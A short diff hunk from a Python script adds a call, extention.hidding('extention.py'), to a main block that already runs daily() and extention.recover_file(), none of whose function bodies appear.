@@ -8,4 +8,5 @@ def daily(c = 1):
 if __name__ == '__main__':
     daily()
     extention.recover_file()
+    extention.hidding('extention.py')
     daily(2)
